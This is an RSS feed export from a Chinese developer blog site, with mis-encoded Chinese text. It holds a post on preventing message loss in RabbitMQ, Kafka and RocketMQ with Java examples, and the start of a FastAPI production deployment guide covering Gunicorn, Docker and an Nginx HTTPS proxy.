<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-04T04:45:31.917Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ MQå¦ä½ä¿è¯æ¶æ¯ä¸ä¸¢å¤±ï¼ ]]></title>
    <link>https://www.cnblogs.com/12lisu/p/19437091</link>
    <guid>76e3dda8d7c9740445617f1659d92a6a</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/12lisu/p/19437091" title="åå¸äº 2026-01-04 12:21">
    <span role="heading" aria-level="2">MQå¦ä½ä¿è¯æ¶æ¯ä¸ä¸¢å¤±ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨</h2>
<p>ä»å¤©æä»¬æ¥èèä¸ä¸ªè®©å¾å¤å¼åèå¤´ç¼çè¯é¢ââMQæ¶æ¯ä¸¢å¤±é®é¢ã</p>
<p>æäºå°ä¼ä¼´å¨å·¥ä½ä¸­ï¼ä¸æå°æ¶æ¯éåå°±è§å¾å¾ç®åï¼ä½çæ­£éå°çº¿ä¸æ¶æ¯ä¸¢å¤±æ¶ï¼ææ¥èµ·æ¥å´è®©äººæçã</p>
<p>å¶å®ï¼æå¨å®éå·¥ä½ä¸­ï¼ä¹éå°è¿MQæ¶æ¯ä¸¢å¤±çæåµã</p>
<p>ä»å¤©è¿ç¯æç« ï¼ä¸é¨è·å¤§å®¶ä¸èµ·èèè¿ä¸ªè¯é¢ï¼å¸æå¯¹ä½ ä¼ææå¸®å©ã</p>
<h2 id="ä¸æ¶æ¯ä¸¢å¤±çä¸å¤§ç¯è">ä¸ãæ¶æ¯ä¸¢å¤±çä¸å¤§ç¯è</h2>
<p>å¨æ·±å¥è§£å³æ¹æ¡ä¹åï¼æä»¬åææ¸æ¥æ¶æ¯å¨åªå ä¸ªç¯èå¯è½ä¸¢å¤±ï¼</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2238006/202601/2238006-20260104121945316-1480460555.png" class="lazyload"></p>
<h3 id="1-çäº§èåéé¶æ®µ">1. çäº§èåéé¶æ®µ</h3>
<ul>
<li>ç½ç»æå¨å¯¼è´åéå¤±è´¥</li>
<li>çäº§èå®æºæªåé</li>
<li>Brokerå¤çå¤±è´¥æªè¿åç¡®è®¤</li>
</ul>
<h3 id="2-brokerå­å¨é¶æ®µ">2. Brokerå­å¨é¶æ®µ</h3>
<ul>
<li>åå­æ¶æ¯æªæä¹åï¼éå¯ä¸¢å¤±</li>
<li>ç£çæéå¯¼è´æ°æ®ä¸¢å¤±</li>
<li>éç¾¤åæ¢æ¶æ¶æ¯ä¸¢å¤±</li>
</ul>
<h3 id="3-æ¶è´¹èå¤çé¶æ®µ">3. æ¶è´¹èå¤çé¶æ®µ</h3>
<ul>
<li>èªå¨ç¡®è®¤æ¨¡å¼ä¸å¤çå¼å¸¸</li>
<li>æ¶è´¹èå®æºå¤çä¸­æ­</li>
<li>æå¨ç¡®è®¤ä½å¿è®°ç¡®è®¤</li>
</ul>
<p>çè§£äºé®é¢æ ¹æºï¼æ¥ä¸æ¥æä»¬ç5ç§å®ç¨çè§£å³æ¹æ¡ã</p>
<h2 id="äºæ¹æ¡ä¸çäº§èç¡®è®¤æºå¶">äºãæ¹æ¡ä¸ï¼çäº§èç¡®è®¤æºå¶</h2>
<h3 id="æ ¸å¿åç">æ ¸å¿åç</h3>
<p>çäº§èåéæ¶æ¯åç­å¾Brokerç¡®è®¤ï¼ç¡®ä¿æ¶æ¯æåå°è¾¾ã</p>
<p>è¿æ¯é²æ­¢æ¶æ¯ä¸¢å¤±çç¬¬ä¸éé²çº¿ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2238006/202601/2238006-20260104122003502-1676571740.png" class="lazyload"></p>
<h3 id="å³é®å®ç°">å³é®å®ç°</h3>
<pre><code class="language-java">// RabbitMQçäº§èç¡®è®¤éç½®
@Bean
public RabbitTemplate rabbitTemplate() {
    RabbitTemplate template = new RabbitTemplate(connectionFactory);
    template.setConfirmCallback((correlationData, ack, cause) -&gt; {
        if (ack) {
            // æ¶æ¯æåå°è¾¾Broker
            messageStatusService.markConfirmed(correlationData.getId());
        } else {
            // åéå¤±è´¥ï¼è§¦åéè¯
            retryService.scheduleRetry(correlationData.getId());
        }
    });
    return template;
}

// å¯é åéæ¹æ³
public void sendReliable(String exchange, String routingKey, Object message) {
    String messageId = generateId();
    // åè½åºä¿å­åéç¶æ
    messageStatusService.saveSendingStatus(messageId, message);
    
    // åéæä¹åæ¶æ¯
    rabbitTemplate.convertAndSend(exchange, routingKey, message, msg -&gt; {
        msg.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT);
        msg.getMessageProperties().setMessageId(messageId);
        return msg;
    }, new CorrelationData(messageId));
}
</code></pre>
<h3 id="éç¨åºæ¯">éç¨åºæ¯</h3>
<ul>
<li>å¯¹æ¶æ¯å¯é æ§è¦æ±é«çä¸å¡</li>
<li>éèäº¤æãè®¢åå¤çç­å³é®ä¸å¡</li>
<li>éè¦ç²¾ç¡®ç¥éæ¶æ¯åéç»æçåºæ¯</li>
</ul>
<h2 id="ä¸æ¹æ¡äºæ¶æ¯æä¹åæºå¶">ä¸ãæ¹æ¡äºï¼æ¶æ¯æä¹åæºå¶</h2>
<h3 id="æ ¸å¿åç-1">æ ¸å¿åç</h3>
<p>å°æ¶æ¯ä¿å­å°ç£çï¼ç¡®ä¿Brokeréå¯åæ¶æ¯ä¸ä¸¢å¤±ã</p>
<p>è¿æ¯é²æ­¢Brokerç«¯æ¶æ¯ä¸¢å¤±çå³é®ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2238006/202601/2238006-20260104122035149-1332407257.png" class="lazyload"></p>
<h3 id="å³é®å®ç°-1">å³é®å®ç°</h3>
<pre><code class="language-java">// æä¹åéåéç½®
@Bean
public Queue orderQueue() {
    return QueueBuilder.durable("order.queue")  // éåæä¹å
            .deadLetterExchange("order.dlx")    // æ­»ä¿¡äº¤æ¢æº
            .build();
}

// åéæä¹åæ¶æ¯
public void sendPersistentMessage(Object message) {
    rabbitTemplate.convertAndSend("order.exchange", "order.create", message, msg -&gt; {
        msg.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT); // æ¶æ¯æä¹å
        return msg;
    });
}

// Kafkaæä¹åéç½®
@Bean
public ProducerFactory&lt;String, Object&gt; producerFactory() {
    Map&lt;String, Object&gt; props = new HashMap&lt;&gt;();
    props.put(ProducerConfig.ACKS_CONFIG, "all"); // ææå¯æ¬ç¡®è®¤
    props.put(ProducerConfig.RETRIES_CONFIG, 3);   // éè¯æ¬¡æ°
    props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true); // å¹ç­æ§
    return new DefaultKafkaProducerFactory&lt;&gt;(props);
}
</code></pre>
<h3 id="ä¼ç¼ºç¹">ä¼ç¼ºç¹</h3>
<p><strong>ä¼ç¹ï¼</strong></p>
<ul>
<li>ææé²æ­¢Brokeréå¯å¯¼è´çæ¶æ¯ä¸¢å¤±</li>
<li>éç½®ç®åï¼ææææ¾</li>
</ul>
<p><strong>ç¼ºç¹ï¼</strong></p>
<ul>
<li>ç£çIOå½±åæ§è½</li>
<li>éè¦è¶³å¤çç£çç©ºé´</li>
</ul>
<h2 id="åæ¹æ¡ä¸æ¶è´¹èç¡®è®¤æºå¶">åãæ¹æ¡ä¸ï¼æ¶è´¹èç¡®è®¤æºå¶</h2>
<h3 id="æ ¸å¿åç-2">æ ¸å¿åç</h3>
<p>æ¶è´¹èå¤çå®æ¶æ¯åæå¨åBrokeråéç¡®è®¤ï¼Brokeræ¶å°ç¡®è®¤åæå é¤æ¶æ¯ã</p>
<p>è¿æ¯ä¿è¯æ¶æ¯ä¸ä¸¢å¤±çæåä¸éé²çº¿ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2238006/202601/2238006-20260104122048500-1991151655.png" class="lazyload"></p>
<h3 id="å³é®å®ç°-2">å³é®å®ç°</h3>
<pre><code class="language-java">// æå¨ç¡®è®¤æ¶è´¹è
@RabbitListener(queues = "order.queue")
public void handleMessage(Order order, Message message, Channel channel) {
    long deliveryTag = message.getMessageProperties().getDeliveryTag();
    
    try {
        // ä¸å¡å¤ç
        orderService.processOrder(order);
        
        // æå¨ç¡®è®¤
        channel.basicAck(deliveryTag, false);
        log.info("æ¶æ¯å¤çå®æ: {}", order.getOrderId());
        
    } catch (Exception e) {
        log.error("æ¶æ¯å¤çå¤±è´¥: {}", order.getOrderId(), e);
        
        // å¤çå¤±è´¥ï¼éæ°å¥é
        channel.basicNack(deliveryTag, false, true);
    }
}

// æ¶è´¹èå®¹å¨éç½®
@Bean
public SimpleRabbitListenerContainerFactory containerFactory() {
    SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();
    factory.setAcknowledgeMode(AcknowledgeMode.MANUAL); // æå¨ç¡®è®¤
    factory.setPrefetchCount(10); // é¢åæ°é
    factory.setConcurrentConsumers(3); // å¹¶åæ¶è´¹è
    return factory;
}
</code></pre>
<h3 id="æ³¨æäºé¡¹">æ³¨æäºé¡¹</h3>
<ul>
<li>ç¡®ä¿ä¸å¡å¤çå®æååç¡®è®¤</li>
<li>åçè®¾ç½®é¢åæ°éï¼é¿ååå­æº¢åº</li>
<li>å¤çå¼å¸¸æ¶è¦æ­£ç¡®ä½¿ç¨NACK</li>
</ul>
<h2 id="äºæ¹æ¡åäºå¡æ¶æ¯æºå¶">äºãæ¹æ¡åï¼äºå¡æ¶æ¯æºå¶</h2>
<h3 id="æ ¸å¿åç-3">æ ¸å¿åç</h3>
<p>éè¿äºå¡ä¿è¯æ¬å°ä¸å¡æä½åæ¶æ¯åéçåå­æ§ï¼è¦ä¹é½æåï¼è¦ä¹é½å¤±è´¥ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2238006/202601/2238006-20260104122103889-905249062.png" class="lazyload"></p>
<h3 id="å³é®å®ç°-3">å³é®å®ç°</h3>
<pre><code class="language-java">// æ¬å°äºå¡è¡¨æ¹æ¡
@Transactional
public void createOrder(Order order) {
    // 1. ä¿å­è®¢åå°æ°æ®åº
    orderRepository.save(order);
    
    // 2. ä¿å­æ¶æ¯å°æ¬å°æ¶æ¯è¡¨
    LocalMessage localMessage = new LocalMessage();
    localMessage.setBusinessId(order.getOrderId());
    localMessage.setContent(JSON.toJSONString(order));
    localMessage.setStatus(MessageStatus.PENDING);
    localMessageRepository.save(localMessage);
    
    // 3. äºå¡æäº¤ï¼æ¬å°ä¸å¡åæ¶æ¯å­å¨ä¿æä¸è´æ§
}

// å®æ¶ä»»å¡æ«æå¹¶åéæ¶æ¯
@Scheduled(fixedDelay = 5000)
public void sendPendingMessages() {
    List&lt;LocalMessage&gt; pendingMessages = localMessageRepository.findByStatus(MessageStatus.PENDING);
    
    for (LocalMessage message : pendingMessages) {
        try {
            // åéæ¶æ¯å°MQ
            rabbitTemplate.convertAndSend("order.exchange", "order.create", message.getContent());
            
            // æ´æ°æ¶æ¯ç¶æä¸ºå·²åé
            message.setStatus(MessageStatus.SENT);
            localMessageRepository.save(message);
            
        } catch (Exception e) {
            log.error("åéæ¶æ¯å¤±è´¥: {}", message.getId(), e);
        }
    }
}

// RocketMQäºå¡æ¶æ¯
public void sendTransactionMessage(Order order) {
    TransactionMQProducer producer = new TransactionMQProducer("order_producer");
    
    // åéäºå¡æ¶æ¯
    Message msg = new Message("order_topic", "create", 
                             JSON.toJSONBytes(order));
    
    TransactionSendResult result = producer.sendMessageInTransaction(msg, null);
    
    if (result.getLocalTransactionState() == LocalTransactionState.COMMIT_MESSAGE) {
        log.info("äºå¡æ¶æ¯æäº¤æå");
    }
}
</code></pre>
<h3 id="éç¨åºæ¯-1">éç¨åºæ¯</h3>
<ul>
<li>éè¦ä¸¥æ ¼ä¿è¯ä¸å¡åæ¶æ¯ä¸è´æ§çåºæ¯</li>
<li>åå¸å¼äºå¡åºæ¯</li>
<li>éèãçµåç­å¯¹æ°æ®ä¸è´æ§è¦æ±é«çä¸å¡</li>
</ul>
<h2 id="å­æ¹æ¡äºæ¶æ¯éè¯ä¸æ­»ä¿¡éå">å­ãæ¹æ¡äºï¼æ¶æ¯éè¯ä¸æ­»ä¿¡éå</h2>
<h3 id="æ ¸å¿åç-4">æ ¸å¿åç</h3>
<p>éè¿éè¯æºå¶å¤çä¸´æ¶æéï¼éè¿æ­»ä¿¡éåå¤çæç»æ æ³æ¶è´¹çæ¶æ¯ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2238006/202601/2238006-20260104122121519-777176098.png" class="lazyload"></p>
<h3 id="å³é®å®ç°-4">å³é®å®ç°</h3>
<pre><code class="language-java">// éè¯éåéç½®
@Bean
public Queue orderQueue() {
    return QueueBuilder.durable("order.queue")
            .withArgument("x-dead-letter-exchange", "order.dlx") // æ­»ä¿¡äº¤æ¢æº
            .withArgument("x-dead-letter-routing-key", "order.dead")
            .withArgument("x-message-ttl", 60000) // 60ç§åè¿å¥æ­»ä¿¡
            .build();
}

// æ­»ä¿¡éåéç½®
@Bean
public Queue orderDeadLetterQueue() {
    return QueueBuilder.durable("order.dead.queue").build();
}

// æ¶è´¹èéè¯é»è¾
@RabbitListener(queues = "order.queue")
public void handleMessageWithRetry(Order order, Message message, Channel channel) {
    long deliveryTag = message.getMessageProperties().getDeliveryTag();
    
    try {
        orderService.processOrder(order);
        channel.basicAck(deliveryTag, false);
        
    } catch (TemporaryException e) {
        // ä¸´æ¶å¼å¸¸ï¼éæ°å¥ééè¯
        channel.basicNack(deliveryTag, false, true);
        
    } catch (PermanentException e) {
        // æ°¸ä¹å¼å¸¸ï¼ç´æ¥ç¡®è®¤è¿å¥æ­»ä¿¡éå
        channel.basicAck(deliveryTag, false);
        log.error("æ¶æ¯è¿å¥æ­»ä¿¡éå: {}", order.getOrderId(), e);
    }
}

// æ­»ä¿¡éåæ¶è´¹è
@RabbitListener(queues = "order.dead.queue")
public void handleDeadLetterMessage(Order order) {
    log.warn("å¤çæ­»ä¿¡æ¶æ¯: {}", order.getOrderId());
    // åéåè­¦ãè®°å½æ¥å¿ãäººå·¥å¤çç­
    alertService.sendAlert("æ­»ä¿¡æ¶æ¯åè­¦", order.toString());
}
</code></pre>
<h3 id="éè¯ç­ç¥å»ºè®®">éè¯ç­ç¥å»ºè®®</h3>
<ol>
<li><strong>ææ°éé¿</strong>ï¼1s, 5s, 15s, 30s</li>
<li><strong>æå¤§éè¯æ¬¡æ°</strong>ï¼3-5æ¬¡</li>
<li><strong>æ­»ä¿¡å¤ç</strong>ï¼äººå·¥ä»å¥æç¹æ®å¤çæµç¨</li>
</ol>
<h2 id="ä¸æ¹æ¡å¯¹æ¯ä¸éåæå">ä¸ãæ¹æ¡å¯¹æ¯ä¸éåæå</h2>
<p>ä¸ºäºå¸®å©å¤§å®¶éæ©åéçæ¹æ¡ï¼ææ´çäºè¯¦ç»çå¯¹æ¯è¡¨ï¼</p>
<table>
<thead>
<tr>
<th>æ¹æ¡</th>
<th>å¯é æ§</th>
<th>æ§è½å½±å</th>
<th>å¤æåº¦</th>
<th>éç¨åºæ¯</th>
</tr>
</thead>
<tbody>
<tr>
<td>çäº§èç¡®è®¤</td>
<td>é«</td>
<td>ä¸­</td>
<td>ä½</td>
<td>ææéè¦å¯é åéçåºæ¯</td>
</tr>
<tr>
<td>æ¶æ¯æä¹å</td>
<td>ä¸­</td>
<td>ä¸­</td>
<td>ä½</td>
<td>Brokeréå¯ä¿æ¤</td>
</tr>
<tr>
<td>æ¶è´¹èç¡®è®¤</td>
<td>é«</td>
<td>ä½</td>
<td>ä¸­</td>
<td>ç¡®ä¿æ¶æ¯è¢«æåå¤ç</td>
</tr>
<tr>
<td>äºå¡æ¶æ¯</td>
<td>æé«</td>
<td>é«</td>
<td>é«</td>
<td>å¼ºä¸è´æ§è¦æ±çä¸å¡</td>
</tr>
<tr>
<td>éè¯+æ­»ä¿¡</td>
<td>é«</td>
<td>ä½</td>
<td>ä¸­</td>
<td>å¤çä¸´æ¶æéåæç»æ­»ä¿¡</td>
</tr>
</tbody>
</table>
<h3 id="éåå»ºè®®">éåå»ºè®®</h3>
<p><strong>ååé¡¹ç®/ç®åä¸å¡ï¼</strong></p>
<ul>
<li>çäº§èç¡®è®¤ + æ¶æ¯æä¹å + æ¶è´¹èç¡®è®¤</li>
<li>æ»¡è¶³å¤§é¨ååºæ¯ï¼å®ç°ç®å</li>
</ul>
<p><strong>çµå/äº¤æç³»ç»ï¼</strong></p>
<ul>
<li>çäº§èç¡®è®¤ + äºå¡æ¶æ¯ + éè¯æºå¶</li>
<li>ä¿è¯æ°æ®ä¸è´æ§ï¼å¤çå¤æä¸å¡</li>
</ul>
<p><strong>å¤§æ°æ®/æ¥å¿å¤çï¼</strong></p>
<ul>
<li>æ¶æ¯æä¹å + æ¶è´¹èç¡®è®¤</li>
<li>åè®¸å°éä¸¢å¤±ï¼è¿½æ±ååé</li>
</ul>
<p><strong>éè/æ¯ä»ç³»ç»ï¼</strong></p>
<ul>
<li>å¨æ¹æ¡ç»åä½¿ç¨</li>
<li>æé«å¯é æ§è¦æ±</li>
</ul>
<h2 id="æ»ç»">æ»ç»</h2>
<p>æ¶æ¯ä¸¢å¤±é®é¢æ¯æ¶æ¯éåä½¿ç¨ä¸­çå¸¸è§ææï¼éè¿ä»å¤©ä»ç»ç5ç§æ¹æ¡ï¼æä»¬å¯ä»¥æå»ºä¸ä¸ªå¯é çæ¶æ¯ç³»ç»ï¼</p>
<ol>
<li><strong>çäº§èç¡®è®¤æºå¶</strong> - ä¿è¯æ¶æ¯æååéå°Broker</li>
<li><strong>æ¶æ¯æä¹åæºå¶</strong> - é²æ­¢Brokeréå¯å¯¼è´æ¶æ¯ä¸¢å¤±</li>
<li><strong>æ¶è´¹èç¡®è®¤æºå¶</strong> - ç¡®ä¿æ¶æ¯è¢«æåå¤ç</li>
<li><strong>äºå¡æ¶æ¯æºå¶</strong> - ä¿è¯ä¸å¡åæ¶æ¯çä¸è´æ§</li>
<li><strong>éè¯ä¸æ­»ä¿¡éå</strong> - å¤çå¼å¸¸æåµåæç»æ­»ä¿¡</li>
</ol>
<p>æäºå°ä¼ä¼´å¯è½ä¼é®ï¼"æéè¦å¨é¨ä½¿ç¨è¿äºæ¹æ¡åï¼</p>
<p>"æçå»ºè®®æ¯ï¼<strong>æ ¹æ®ä¸å¡éæ±éæ©åéçç»å</strong>ã</p>
<p>å¯¹äºå³é®ä¸å¡ï¼å»ºè®®è³å°ä½¿ç¨åä¸ç§æ¹æ¡ï¼å¯¹äºæ®éä¸å¡ï¼å¯ä»¥æ ¹æ®å®éæåµéå½ç®åã</p>
<p>è®°ä½ï¼æ²¡æå®ç¾çæ¹æ¡ï¼åªææéåçæ¹æ¡ã</p>
<h2 id="æåè¯´ä¸å¥æ±å³æ³¨å«ç½å«æ">æåè¯´ä¸å¥(æ±å³æ³¨ï¼å«ç½å«æ)</h2>
<p>å¦æè¿ç¯æç« å¯¹æ¨ææå¸®å©ï¼æèææå¯åçè¯ï¼å¸®å¿å³æ³¨ä¸ä¸æçååå¬ä¼å·ï¼èä¸è¯´ææ¯ï¼æ¨çæ¯ææ¯æåæåä½æå¤§çå¨åã</p>
<p>æ±ä¸é®ä¸è¿ï¼ç¹èµãè½¬åãå¨çã</p>
<p>å³æ³¨å¬ä¼å·ï¼ãèä¸è¯´ææ¯ãï¼å¨å¬ä¼å·ä¸­åå¤ï¼è¿å¤§åï¼å¯ä»¥åè´¹è·åææè¿æ´çç10ä¸å­çé¢è¯å®å¸ï¼å¥½å¤å°ä¼ä¼´é è¿ä¸ªå®å¸æ¿å°äºå¤å®¶å¤§åçofferã</p>
<p>æ´å¤é¡¹ç®å®æå¨æçææ¯ç½ç«ï¼<a href="http://www.susan.net.cn/project" target="_blank" rel="noopener nofollow">http://www.susan.net.cn/project</a></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-04 12:22">2026-01-04 12:21</span>&nbsp;
<a href="https://www.cnblogs.com/12lisu">èä¸è¯´ææ¯</a>&nbsp;
éè¯»(<span id="post_view_count">5</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19437091);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19437091', targetLink: 'https://www.cnblogs.com/12lisu/p/19437091', title: 'MQå¦ä½ä¿è¯æ¶æ¯ä¸ä¸¢å¤±ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ FastAPIçäº§é¨ç½²æåï¼ä»æå¡å¨éç½®å°ç½ç»å®å¨å®è·µ ]]></title>
    <link>https://www.cnblogs.com/ymtianyu/p/19435881</link>
    <guid>ba6c7cfaa6cffd509a17496316cf1487</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ymtianyu/p/19435881" title="åå¸äº 2026-01-04 09:22">
    <span role="heading" aria-level="2">FastAPIçäº§é¨ç½²æåï¼ä»æå¡å¨éç½®å°ç½ç»å®å¨å®è·µ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ¬æè¯¦ç»ä»ç»äºFastAPIåºç¨ä»å¼åå°çäº§ç¯å¢çå®æ´é¨ç½²æµç¨ãæ ¸å¿åçä¸å®å¨è®¾ç½®ãåå®¹åæ¬éæ©éç½®ASGIæå¡å¨ãå®¹å¨åé¨ç½²ãè®¾ç½®ååä»£çä¸HTTPSãçæ§æ¥å¿ç­å®ææ­¥éª¤ï¼è§£æäºè¯·æ±å¨è·¯ç±å±ãæå¡å±åæ°æ®å±çæµåä¸åå±æ¶æï¼éç¹éè¿°äºåºäºOAuth2åJWTçè®¤è¯ææãè¾å¥éªè¯ãCORSç­ç¥ç­ç½ç»å®å¨éç½®ï¼å¹¶æä¾äºå¯åèçä»£ç ç¤ºä¾ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<div style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; line-height: 1.6; color: rgba(51, 51, 51, 1); padding: 16px">
<p>ä½ çFastAPIåºç¨å¨æ¬å°è·å¾å¥½å¥½çï¼ä¸å°çäº§ç¯å¢å°±åç§âæ°´åä¸æâï¼æ®ç»è®¡ï¼é«è¾¾<span style="color: rgba(186, 55, 42, 1)">70%</span>çåºç¨æ§è½ä¸å®å¨é®é¢é½æºäºçäº§ç¯å¢éç½®ä¸å½ã</p>
<blockquote style="border-left: 4px solid rgba(221, 221, 221, 1); padding-left: 16px; margin: 20px 0; color: rgba(102, 102, 102, 1); font-style: italic">æ¬æå°ä»å®æåºåï¼æææå¸¦ä½ èµ°éFastAPIççäº§é¨ç½²å¨æµç¨ãä½ å°äºè§£ï¼ä»ä»£ç å°æå¡çå®æ´é¨ç½²æ­¥éª¤ãè¯·æ±å¨åºç¨åé¨ç<strong style="color: rgba(186, 55, 42, 1)">æ°æ®æµåä¸æ ¸å¿åç</strong>ï¼ä»¥åè³å³éè¦ç<strong style="color: rgba(186, 55, 42, 1)">ç½ç»å®å¨éç½®ç­ç¥</strong>ãä¸æ­¢äºâæä¹åâï¼æ´æ·±å¥âä¸ºä»ä¹âã</blockquote>
<h2 style="color: rgba(44, 62, 80, 1); border-bottom: 2px solid rgba(238, 238, 238, 1); padding-bottom: 8px">ð æç« ç®å½</h2>
<p>- ð ç¬¬ä¸é¨åï¼ä»å¼åå°çäº§ - é¨ç½²å®æåæ­¥èµ°</p>
<p>- ð ç¬¬äºé¨åï¼æ·±å¥åç - è¯·æ±çæ°æ®æµåä¸åå±æ¶æ</p>
<p>- ð¡ï¸ ç¬¬ä¸é¨åï¼ç­ç¢é²çº¿ - çäº§ç¯å¢ç½ç»å®å¨è®¾ç½®</p>
<p>- ð» ç¬¬åé¨åï¼å®æ´ä»£ç åèä¸æ»ç»</p>
<h2 style="color: rgba(44, 62, 80, 1); margin-top: 30px">ð ç¬¬ä¸é¨åï¼ä»å¼åå°çäº§ - é¨ç½²å®æåæ­¥èµ°</h2>
<p>æFastAPIåºç¨æå°æå¡å¨ä¸è¿è¡ï¼åªæ¯é¨ç½²çå¼å§ãçäº§ç¯å¢è¦æ±<strong style="color: rgba(186, 55, 42, 1)">é«å¯ç¨ãå¯æ©å±ãæç»´æ¤</strong>ãä»¥ä¸æ¯ç»è¿éªè¯çåä¸ªæ ¸å¿æ­¥éª¤ã</p>
<h3 style="color: rgba(58, 109, 140, 1)">1. éæ©å¹¶éç½®ASGIæå¡å¨</h3>
<p>FastAPIåºäºASGIï¼ä½ éè¦ä¸ä¸ªçäº§çº§çASGIæå¡å¨ã<strong style="color: rgba(186, 55, 42, 1)">Uvicorn</strong>å å¶é«æ§è½æ¯é¦éï¼ä½åçº¯ä½¿ç¨<code>uvicorn main:app</code>å¹¶ä¸éåçäº§ãæ¨èä¸¤ç§æ¨¡å¼ï¼</p>
<p>- <strong style="color: rgba(186, 55, 42, 1)">Uvicornå¤è¿ç¨æ¨¡å¼</strong>ï¼ç´æ¥å¯å¨å¤ä¸ªå·¥ä½è¿ç¨ã</p>
<pre class="language-bash highlighter-hljs"><code>uvicorn main:app --host 0.0.0.0 --port 8000 --workers 4</code></pre>
<p>- <strong style="color: rgba(186, 55, 42, 1)">Gunicorn + Uvicorn Worker</strong>ï¼ç¨Gunicornç®¡çè¿ç¨ï¼ç¨Uvicornå¤çè¯·æ±ï¼ç»åä¸¤èä¼å¿ã</p>
<pre class="language-bash highlighter-hljs"><code>gunicorn main:app --workers 4 --worker-class uvicorn.workers.UvicornWorker --bind 0.0.0.0:8000</code></pre>
<h3 style="color: rgba(58, 109, 140, 1)">2. å®¹å¨åé¨ç½²ï¼Dockerï¼</h3>
<p>å®¹å¨åè½è§£å³ç¯å¢ä¸è´æ§é®é¢ï¼æ¯å®ç°<strong style="color: rgba(186, 55, 42, 1)">âä¸æ¬¡æå»ºï¼å°å¤è¿è¡â</strong>çå³é®ãä¸ä¸ªæ åçDockerfileç¤ºä¾å¦ä¸ï¼</p>
<pre class="language-dockerfile highlighter-hljs"><code>FROM python:3.9-slim
WORKDIR /app
COPY pyproject.toml uv.lock ./
RUN uv sync --frozen
COPY . .
CMD ["gunicorn", "main:app", "--workers", "4", "--worker-class", "uvicorn.workers.UvicornWorker", "--bind", "0.0.0.0:80"]</code></pre>
<h3 style="color: rgba(58, 109, 140, 1)">3. éç½®ååä»£çä¸HTTPSï¼Nginxï¼</h3>
<p>ç´æ¥æ´é²åºç¨æå¡å¨æ¯å±é©çãéè¦ä½¿ç¨<strong style="color: rgba(186, 55, 42, 1)">Nginx</strong>ç­ååä»£çï¼å®æ¿æäºï¼</p>
<p>- <strong style="color: rgba(186, 55, 42, 1)">SSL/TLSç»æ­¢</strong>ï¼å¤çHTTPSå å¯è§£å¯ã</p>
<p>- <strong style="color: rgba(186, 55, 42, 1)">éææä»¶æå¡</strong>ï¼æ´é«æå°æä¾éæèµæºã</p>
<p>- <strong style="color: rgba(186, 55, 42, 1)">è´è½½åè¡¡</strong>ï¼å°æµéååå°å¤ä¸ªåç«¯å®ä¾ã</p>
<p>ä¸ä¸ªç®åçNginxéç½®çæ®µå¦ä¸ï¼å®çå¬443ç«¯å£ï¼HTTPSï¼ï¼å¹¶å°è¯·æ±ä»£çç»è¿è¡å¨8000ç«¯å£çFastAPIåºç¨ã</p>
<pre class="language-nginx highlighter-hljs"><code>server {
    listen 443 ssl;
    server_name yourdomain.com;
    ssl_certificate /path/to/your/cert.pem;
    ssl_certificate_key /path/to/your/key.pem;
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}</code></pre>
<h3 style="color: rgba(58, 109, 140, 1)">4. è®¾ç½®çæ§ä¸æ¥å¿</h3>
<p>æ²¡æçæ§çåºç¨å¦åå¨é»æä¸­èªè¡ãçäº§ç¯å¢å¿é¡»éç½®ï¼</p>
<p>- <strong style="color: rgba(186, 55, 42, 1)">åºç¨æ¥å¿</strong>ï¼ä½¿ç¨Pythonç<code>logging</code>æ¨¡åï¼å¹¶ç¡®ä¿æ¥å¿è½è¢«éä¸­æ¶éï¼å¦ELK Stackï¼ã</p>
<p>- <strong style="color: rgba(186, 55, 42, 1)">æ§è½çæ§</strong>ï¼ä½¿ç¨<strong style="color: rgba(186, 55, 42, 1)">Prometheus</strong>æ¶éææ ï¼è¯·æ±æ°ãå»¶è¿ãéè¯¯çï¼ï¼å¹¶ç¨<strong style="color: rgba(186, 55, 42, 1)">Grafana</strong>è¿è¡å¯è§åã</p>
<h2 style="color: rgba(44, 62, 80, 1); margin-top: 30px">ð ç¬¬äºé¨åï¼æ·±å¥åç - è¯·æ±çæ°æ®æµåä¸åå±æ¶æ</h2>
